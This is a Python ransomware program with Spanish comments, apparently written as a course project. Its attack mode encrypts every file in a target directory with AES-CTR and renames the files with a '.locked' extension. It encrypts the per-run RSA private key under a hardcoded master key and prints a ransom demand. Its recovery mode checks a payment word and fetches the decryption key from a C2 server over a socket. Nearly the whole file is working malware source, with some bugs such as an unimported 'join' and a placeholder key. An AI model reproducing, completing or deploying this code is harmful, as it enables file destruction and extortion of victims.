#!/usr/bin/env python3

import base64
import struct
import os 
import glob
import sys
import socket
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

#  LLAVE PUBLICA PERMANENTE (hardcodeada)
LLAVE_PUBLICA_PERMANENTE = b"""-----BEGIN PUBLIC KEY-----
Llave publica permanentes
-----END PUBLIC KEY-----"""

#  CONFIGURACION
DELIMITADOR     = b'\r\n'           # de utils.py
SEGMENTOS_PATH  = "segmentos.bin"   # segmentos cifrados guardados en disco
TAM_SEGMENTO    = 190               # maximo bytes por segmento para RSA-OAEP con SHA256 y RSA-2048


# Generar las llaves privada y publica locales
def generar_privada():
    """Genera llave privada RSA-2048. (de generarLlaves.py)"""
    return rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

def generar_publica(privada):
    """Deriva llave publica de la privada. (de generarLlaves.py)"""
    return privada.public_key()

def serializar_privada(privada):
    """Convierte llave privada a bytes PEM. (de generarLlaves.py)"""
    return privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

def desserializar_privada_bytes(pem_bytes):
    """Carga llave privada desde bytes PEM. (de rsa_padding.py)"""
    return serialization.load_pem_private_key(
        pem_bytes, backend=default_backend(), password=None
    )

def desserializar_publica_bytes(pem_bytes):
    """Carga llave publica desde bytes PEM. (de rsa_padding.py)"""
    return serialization.load_pem_public_key(
        pem_bytes, backend=default_backend()
    )


#  Cifrado y descifrado con RSA (de rsa_padding.py)
def cifrar_con_rsa(llave_publica, datos):
    """
    Cifra datos con RSA-OAEP. (de rsa_padding.py)
    Limite: ~190 bytes con RSA-2048 y OAEP-SHA256.
    """
    return llave_publica.encrypt(
        datos,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def descifrar_con_rsa(llave_privada, datos):
    """Descifra datos con RSA-OAEP. (de rsa_padding.py)"""
    return llave_privada.decrypt(
        datos,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )


# ═════════════════════════════════════════════
#  SEGMENTACION DE LLAVE PRIVADA LOCAL
# Parte hecha con IAAAA!!!!!!!! - No usar a menos que lo entiendas
# ═════════════════════════════════════════════

def segmentar_llave(llave_privada_local_pem):
    """
    Segmenta la llave privada local en bloques de TAM_SEGMENTO bytes.

    La llave privada en PEM (~1700 bytes) es demasiado grande para
    cifrarse de una sola vez con RSA-OAEP (~190 bytes max con RSA-2048).
    Al segmentarla, cada bloque cabe en un solo cifrado RSA.

    Retorna: lista de bytes, cada uno de maximo TAM_SEGMENTO bytes.
    """
    segmentos = []
    for i in range(0, len(llave_privada_local_pem), TAM_SEGMENTO):
        segmentos.append(llave_privada_local_pem[i : i + TAM_SEGMENTO])
    print(f"✔ Llave privada segmentada en {len(segmentos)} bloques de max {TAM_SEGMENTO} bytes.")
    return segmentos

def cifrar_segmentos(segmentos, llave_publica_permanente):
    """
    Cifra cada segmento con RSA-OAEP usando la llave publica permanente
    y los guarda en disco para enviarlos al CC en la fase de recuperacion.

    Cada segmento cifrado tiene exactamente 256 bytes (RSA-2048).

    Formato guardado en disco:
      [4B: numero de segmentos] + N * [256B: segmento cifrado]
    """
    segmentos_cifrados = []
    for segmento in segmentos:
        cifrado = cifrar_con_rsa(llave_publica_permanente, segmento)
        segmentos_cifrados.append(cifrado)

    with open(SEGMENTOS_PATH, 'wb') as f:
        f.write(struct.pack(">I", len(segmentos_cifrados)))
        for seg in segmentos_cifrados:
            f.write(seg)

    print(f"✔ {len(segmentos_cifrados)} segmentos cifrados guardados en '{SEGMENTOS_PATH}'.")
    return segmentos_cifrados

# ESTA PARTE ESTA HECHA CON IA!!!!! NO HAY QUE USAR A MENOS QUE LO ENTENDAMOs
def cargar_segmentos_cifrados():
    """
    Carga los segmentos cifrados desde disco.

    Formato leido:
      [4B: numero de segmentos] + N * [256B: segmento cifrado RSA-2048]
    """
    with open(SEGMENTOS_PATH, 'rb') as f:
        num_segmentos = struct.unpack(">I", f.read(4))[0]
        segmentos = []
        for _ in range(num_segmentos):
            segmentos.append(f.read(256))
    print(f"✔ {len(segmentos)} segmentos cifrados cargados desde disco.")
    return segmentos

# ═════════════════════════════════════════════
#  COMUNICACION CON SERVIDOR CC (de utils.py)
# ESTA PARTE ESTA HECHA CON IA!!!!! NO HAY QUE USAR A MENOS QUE LO ENTENDAMOS
# ═════════════════════════════════════════════
def mandar_datos(sock, datos: bytes):
    """Envia datos por el socket en base64 + delimitador. (de utils.py)"""
    sock.sendall(base64.b64encode(datos) + DELIMITADOR)

def leer_datos(sock) -> bytes:
    """Lee datos del socket hasta encontrar el delimitador. (de utils.py)"""
    chunk = sock.recv(1024)
    datos = b''
    while not chunk.endswith(DELIMITADOR):
        datos += chunk
        chunk = sock.recv(1024)
    datos += chunk
    return base64.b64decode(datos[:-len(DELIMITADOR)])

def enviar_segmentos(ip_servidor, puerto_servidor):
    """
    Envia los segmentos cifrados al servidor CC y recibe
    la llave privada local completa ya descifrada y unida por el CC.

    Protocolo:
      Ransomware → CC : numero de segmentos (4B empaquetados)
      Ransomware → CC : cada segmento cifrado (uno por mandar_datos)
      CC → Ransomware : llave privada local PEM completa
    """
    segmentos_cifrados = cargar_segmentos_cifrados()

    print(f"Conectando al servidor CC en {ip_servidor}:{puerto_servidor}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_servidor, puerto_servidor))

        # Enviar numero de segmentos para que el CC sepa cuantos esperar
        mandar_datos(s, struct.pack(">I", len(segmentos_cifrados)))

        # Enviar cada segmento cifrado
        for segmento in segmentos_cifrados:
            mandar_datos(s, segmento)
        print(f"✔ {len(segmentos_cifrados)} segmentos enviados al CC.")

        # Recibir llave privada local completa (unida y descifrada por el CC)
        llave_privada_local_pem = leer_datos(s)
        print("✔ Llave privada local recibida del CC.")

    return llave_privada_local_pem

#  CIFRADO AES-CTR
def cifrar_archivos(directorio, llave_publica_local):
    """
    Cifra todos los archivos del directorio con AES-CTR.

    Por cada archivo:
      1. Genera una llave AES-256 y un IV unicos
      2. Cifra el contenido con AES-CTR
      3. Cifra la llave AES con RSA-OAEP (llave publica local)
      4. Guarda: [contenido_cifrado] + [IV 16B] + [tam_llave 4B] + [llave_AES_cifrada]
      5. Sobreescribe el archivo original con la version cifrada

    resultado: contenido_cifrado + IV + tam_llave + llave_AES_cifrada
    """

    archivos = []

    # glob permite encontrar nombres de rutas que coinciden con un patron en especifico, en este caso se usa "**" para tomar todo dentro del directorio.
    for ruta in glob.glob(join(directorio, '**'), recursive=True):
        if os.path.isfile(ruta): #Solo toma los archivos, no toma las carpetas
            archivos.append(ruta) #Lo agrega a la lista de archivos

    if not archivos:
        print(f"[+] No se encontraron archivos en: {directorio}")
        sys.exit(1)

    print(f"Cifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        with open(ruta, 'rb') as f:
            contenido = f.read()

        # Generar llave AES-256 e IV unicos por archivo
        llave_aes = os.urandom(32)
        iv = os.urandom(16)

        # Cifrar con AES-CTR
        cipher = Cipher(
            algorithms.AES(llave_aes),
            modes.CTR(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        contenido_cifrado = encryptor.update(contenido) + encryptor.finalize()

        # Cifrar llave AES con llave publica local (RSA-OAEP)
        llave_aes_cifrada = cifrar_con_rsa(llave_publica_local, llave_aes)

        # Guardar: [contenido_cifrado] + [IV 16B] + [tam_llave 4B] + [llave_AES_cifrada]
        #Esta parte todavia la estoy revisando porque no tengo claro como hacerlo
        with open(ruta, 'wb') as f:
            f.write(contenido_cifrado)
            f.write(iv)
            f.write(struct.pack(">I", len(llave_aes_cifrada)))
            f.write(llave_aes_cifrada)

        nueva_ruta = ruta + ".locked" #se agrega la extension locked
        os.rename(ruta, nueva_ruta) #se renombra los archivos 

        print(f"[+] Cifrado: {os.path.basename(nueva_ruta)}")

    print(f"[+] {len(archivos)} archivo(s) cifrados.")


#DESCIFRADO AES-CTR
def descifrar_archivos(directorio, llave_privada_local):
    """
    Descifra todos los archivos del directorio cifrados por esta herramienta.

    Por cada archivo:
      1. Extrae IV, tam_llave y llave_AES_cifrada del final del archivo
      2. Descifra la llave AES con RSA-OAEP (llave privada local)
      3. Descifra el contenido con AES-CTR
      4. Restaura el archivo original en texto plano

    Formato leido: [contenido_cifrado] + [IV 16B] + [tam_llave 4B] + [llave_AES_cifrada]
    """

    archivos = []

    # se agrega "*.locked" para que tome solo los archivos con esa extension
    for ruta in glob.glob(join(directorio, '**', '*.locked'), recursive=True):
        if os.path.isfile(ruta):
            archivos.append(ruta)

    print(f"Descifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        with open(ruta, 'rb') as f:
            datos = f.read()

        # Extraer componentes desde el final
        # Estructura: [...contenido_cifrado...][IV 16B][tam_llave 4B][llave_AES_cifrada 256B]
        llave_aes_cifrada = datos[-256:]
        tam_llave_aes     = struct.unpack(">I", datos[-256-4 : -256])[0]
        iv                = datos[-256-4-16 : -256-4]
        contenido_cifrado = datos[:-256-4-16]

        # Descifrar llave AES con llave privada local (RSA-OAEP)
        llave_aes = descifrar_con_rsa(llave_privada_local, llave_aes_cifrada)

        # Descifrar contenido con AES-CTR
        cipher = Cipher(
            algorithms.AES(llave_aes),
            modes.CTR(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        contenido = decryptor.update(contenido_cifrado) + decryptor.finalize()

        # Restaurar archivo original
        with open(ruta, 'wb') as f:
            f.write(contenido)

        ruta_original = ruta.removesuffix(".locked") # se quita la extension
        os.rename(ruta, ruta_original) # se restaura el nombre del archivo

        print(f"[+] Descifrado: {os.path.basename(ruta_original)}")

    print(f"[+] {len(archivos)} archivo(s) restaurados.")

def ataque(directorio):
    """
    1. Carga la llave publica permanente (hardcodeada)
    2. Genera el par de llaves RSA locales
    3. Segmenta la llave privada local
    4. Cifra los segmentos con la llave publica permanente y los guarda en disco
    5. Borra la llave privada local de memoria
    6. Cifra los archivos del directorio con AES-CTR
    7. Muestra el mensaje de infeccion
    """
    print("Iniciando ataque...")

    # Paso 1: cargar llave publica permanente
    publica_permanente = desserializar_publica_bytes(LLAVE_PUBLICA_PERMANENTE)

    # Paso 2: generar par de llaves locales
    print("Generando par de llaves RSA locales...")
    privada_local = generar_privada()
    publica_local = generar_publica(privada_local)
    privada_local_pem = serializar_privada(privada_local)
    print("[+] Par de llaves locales generadas")

    # Paso 3: segmentar la llave privada local
    segmentos = segmentar_llave(privada_local_pem)

    # Paso 4: cifrar segmentos con llave publica permanente y guardar en disco
    cifrar_segmentos(segmentos, publica_permanente)

    # Paso 5: borrar llave privada local de memoria
    del privada_local
    del privada_local_pem
    print("[+] Llave privada local eliminada de memoria.")

    # Paso 6: cifrar archivos del directorio
    cifrar_archivos(directorio, publica_local)

    # Paso 7: mensaje de infeccion
    print("*** Como castigo por tus pecados digitales, la undécima plaga ha caído sobre ti ***")
    print("*** TUS ARCHIVOS HAN SIDO CIFRADOS ***")
    print("[+] Todos tus archivos han sido cifrados")
    print("[+] Para recuperarlos debes realizar el pago por el rescate.")

def recuperacion(directorio, ip_servidor, puerto_servidor):
    """
    1. Pide la palabra de rescate para confirmar el pago
    2. Envia los segmentos cifrados al servidor CC
    3. Recibe la llave privada local completa (descifrada y unida por el CC)
    4. Descifra los archivos del directorio
    5. Muestra mensaje de recuperacion
    """

    # Paso 1: confirmar pago
    confirmacion = input("Ingresa el codigo de rescate: ").strip()
    if confirmacion != "Pagado":
        print("[+] Pago no confirmafo. Tus archivos permanecen cifrados.")
        sys.exit(1)

    # Paso 2 y 3: enviar segmentos y recibir llave privada local completa
    print("[+] Codigo correcto. Iniciando recuperacion...")
    llave_privada_local_pem = enviar_segmentos(ip_servidor, puerto_servidor)

    # Paso 4: reconstruir objeto llave privada y descifrar archivos
    privada_local = desserializar_privada_bytes(llave_privada_local_pem)
    print("[+] Llave privada local reconstruida")
    descifrar_archivos(directorio, privada_local)

    # Paso 5: mensaje de recuperacion
    print("*** TUS ARCHIVOS HAN SIDO RESTAURADOS ***")
    print("Gracias por su preferencia. Estamos mejorando el servicio para futuros reencuentros.")

if __name__ == "__main__":
    all_args = argparse.ArgumentParser()
    # Modo de operacion (mutuamente excluyentes)
    modo = all_args.add_mutually_exclusive_group(required=True)
    modo.add_argument("--ataque",       action="store_true", help="Cifra los archivos del directorio")
    modo.add_argument("--recuperacion", action="store_true", help="Descifra los archivos tras el pago")
    # Argumento comun
    all_args.add_argument("--directorio", required=True, help="Directorio donde se realizara el ataque/recuperacion")
    # Argumentos solo para recuperacion
    all_args.add_argument("--ip", help="IP del servidor CC")
    all_args.add_argument("--puerto", help="Puerto del servidor CC")

    args = vars(all_args.parse_args())

    # Validar directorio
    if not os.path.isdir(args["directorio"]):
        print(f"[!] El directorio no existe: {args['directorio']}")
        sys.exit(1)

    if args["ataque"]:
        ataque(args["directorio"])
    elif args["recuperacion"]:
        if not os.path.exists(SEGMENTOS_PATH):
            print(f"[+] No se encontro '{SEGMENTOS_PATH}'.")
            #print("Asegurate de haber ejecutado primero el modo --ataque.")
            sys.exit(1)
        recuperacion(args["directorio"], args["ip"], args["puerto"])

    """
    Modos de uso:
    # Cifrar archivos (ataque):
    python3 ransomware.py --ataque --directorio /ruta/victima

    # Recuperar archivos (tras el pago):
    python3 ransomware.py --recuperacion --directorio /ruta/victima --ip 127.0.0.1 --puerto 9999
    """